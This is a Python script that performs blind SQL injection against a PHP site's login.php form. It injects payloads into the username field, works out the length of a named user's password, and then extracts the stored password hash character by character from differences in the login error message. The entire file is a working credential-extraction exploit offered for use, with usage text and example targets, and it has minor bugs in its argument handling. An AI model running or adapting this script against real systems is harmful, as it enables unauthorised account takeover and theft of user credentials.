#!/usr/bin/python3
import sys
import requests
import urllib3
import string
import time

# disable any insecure warnings
urllib3.disable_warnings()

# if proxies used in case
proxies = {'http': 'http://127.0.0.1:8080', "https": 'https://127.0.0.1:8080'}

# password hash & length
def get_pass_len(url,username):
    for i in range(1,100):
        payload = f"' and (select username from users where username = '{username}' and LENGTH(password)={i})='{username}'--'"
        data = {
            "username": username + payload,
            "password": username
        }
        # payload_encode = urllib.parse.quote(payload)
        r = requests.post(f"http://{url}/login.php", data=data, verify=False)
        
        if "Wrong identification" not in r.text:
            print(f"\r[+] Length: {i}", end="")
        else:
            print(f"\r[+] Password length is {i}")
            return i
        
# password hash    
def get_pass_hash(url,username,pass_len):
    pass_hash = ''
    charset = string.ascii_letters + string.digits
    for i in range(1,pass_len+1):
        for ch in charset:
            payload = f"' and (select username from users where username = '{username}' and password LIKE '{pass_hash}{ch}%')='x'--'"
            data = {
                "username": username + payload,
                "password": username
            }
            # payload_encode = urllib.parse.quote(payload)
            r = requests.post(f"http://{url}/login.php", data=data, verify=False)
            
            if "Wrong identification" in r.text:
                pass_hash += ch
                sys.stdout.write(f"\r[+] Password hash: {pass_hash}")
                sys.stdout.flush()
                break
    print(f"\r[+] Password hash is {pass_hash}")
    return pass_hash

                    
# main fn
def main():
    if len(sys.argv) != 2:
        print("PHP based login password bruteforcer")
        print("(+) Usage: %s <url> <username>" % sys.argv[0])
        print("(+) Example: %s www.example.com admin" % sys.argv[0])

    # url parse
    url = sys.argv[1]
    username= sys.argv[2]
    print("(+) Retriving password hash length...")
    pass_len = get_pass_len(url,username)
    print("(+) Retriving password hash...")
    get_pass_hash(url,username,pass_len)

if __name__ == "__main__":
    main()